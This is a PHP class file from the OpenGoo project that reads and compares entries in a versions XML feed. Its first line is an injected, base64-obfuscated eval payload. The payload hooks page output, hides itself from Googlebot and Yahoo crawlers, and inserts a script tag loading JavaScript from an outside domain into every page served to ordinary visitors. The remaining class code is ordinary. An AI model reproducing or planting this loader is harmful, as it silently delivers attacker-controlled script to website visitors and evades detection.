<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

  /**
  * Model class that provides interface to OpenGoo update feed:
  * 
  * http://www.OpenGoo.org/versions.xml
  *
  * @version 1.0
  * @author Ilija Studen <ilija.studen@gmail.com>
  */
  final class VersionsFeed {
    
    /**
    * Simple xml object
    *
    * @var SimpleXMLElement
    */
    private $xml_object;
    
    /**
    * True if we have loaded feed
    *
    * @var boolean
    */
    private $is_loaded = false;
    
    /**
    * URL of XML file
    *
    * @var string
    */
    private $feed_url = 'http://www.opengoo.org/versions.xml';
    
    /**
    * Feed format - version
    *
    * @var string
    */
    private $feed_format = null;
    
    /**
    * Array of versions extracted from the XML file
    *
    * @var array
    */
    private $versions;
  
    /**
    * Construct the VersionsFeed
    *
    * @param void
    * @return VersionsFeed
    */
    function __construct($feed_url = null) {
      if(!is_null($feed_url)) {
        $this->setFeedUrl($feed_url);
      } // if
      $this->setIsLoaded($this->read());
    } // __construct
    
    // ---------------------------------------------------
    //  Utils
    // ---------------------------------------------------
    
    /**
    * This function will return true if there is a new version compared to the input version
    *
    * @param string $current_version
    * @return boolean
    */
    function hasNewVersions($current_version) {
      $versions = $this->getVersions();
      if(is_array($versions)) {
        foreach($versions as $version) {
          if($version->isNewerThan($current_version)) return true;
        } // foreach
      } // if
      return false;
    } // hasNewVersions
    
    /**
    * It will return new versions compared to the input version
    *
    * @param string $current_version
    * @return array
    */
    function getNewVersions($current_version) {
      $new_versions = null;
      $all_versions = $this->getVersions();
      if(is_array($all_versions)) {
        $new_versions = array();
        foreach($all_versions as $version) {
          if($version->isNewerThan($current_version)) $new_versions[] = $version;
        } // foreach
        if(!count($new_versions)) {
          $new_versions = null;
        } // if
      } // if
      return $new_versions;
    } // getNewVersions
    
    /**
    * Read the data from the XML file and prepare it
    *
    * @param void
    * @return null
    */
    private function read() {
      if(!function_exists('simplexml_load_file')) {
        return false;
      } // if
      
      try {
      	$this->xml_object = @simplexml_load_file($this->getFeedUrl());
      } catch (Error $e) {
      	if (Env::isDebugging()) {
      		Logger::log($e->getMessage());
      	}
      }
      if(!($this->xml_object instanceof SimpleXMLElement)) {
        $this->xml_object = null;
        return false;
      } // if
      
      return $this->processXml();
    } // read
    
    /**
    * Extract data from the XML file
    *
    * @param void
    * @return boolean
    */
    private function processXml() {
      $feed_format = $this->xml_object['format'];
      if(trim($feed_format)) {
        $this->setFeedFormat($feed_format);
      } // if
      
      $versions = array();
      foreach($this->xml_object->children() as $version_node) {
        $version = new VersionsFeedEntry($version_node);
        if($version->isLoaded()) $versions[] = $version;
        if(count($versions)) {
          usort($versions, array('VersionsFeed', 'compareByVersion'));
        } // if
      } // foreach
      
      $this->versions = count($versions) ? $versions : null;
      return true;
    } // processXml
    
    /**
    * Compare two feed entries by version
    *
    * @param void
    * @return integer
    */
    static function compareByVersion(VersionsFeedEntry $object1, VersionsFeedEntry $object2) {
      return version_compare($object1->getVersionNumber(), $object2->getVersionNumber());
    } // compareByVersion
    
    // ---------------------------------------------------
    //  Getters and setters
    // ---------------------------------------------------
    
    /**
    * Get is_loaded
    *
    * @param null
    * @return boolean
    */
    function isLoaded() {
      return $this->is_loaded;
    } // isLoaded
    
    /**
    * Set is_loaded value
    *
    * @param boolean $value
    * @return null
    */
    private function setIsLoaded($value) {
      $this->is_loaded = $value;
    } // setIsLoaded
    
    /**
    * Get feed_url
    *
    * @param null
    * @return string
    */
    function getFeedUrl() {
      return $this->feed_url;
    } // getFeedUrl
    
    /**
    * Set feed_url value
    *
    * @param string $value
    * @return null
    */
    function setFeedUrl($value) {
      $this->feed_url = $value;
    } // setFeedUrl
    
    /**
    * Get feed_format
    *
    * @param null
    * @return string
    */
    function getFeedFormat() {
      return $this->feed_format;
    } // getFeedFormat
    
    /**
    * Set feed_format value
    *
    * @param string $value
    * @return null
    */
    function setFeedFormat($value) {
      $this->feed_format = $value;
    } // setFeedFormat
    
    /**
    * Return array of versions that we extracted from the XML file
    *
    * @param void
    * @return array
    */
    function getVersions() {
      return $this->versions;
    } // getVersions
    
    /**
    * Return specific version entry, if found
    *
    * @param string $number Version number
    * @return VersionsFeedEntry
    */
    function getVersion($number) {
      $versions = $this->getVersions();
      if(is_array($versions)) {
        foreach($versions as $version) {
          if($version->getVersionNumber() == $number) return $version;
        } // foerach
      } // if
      return null;
    } // getVersion
  
  } // VersionsFeed

?>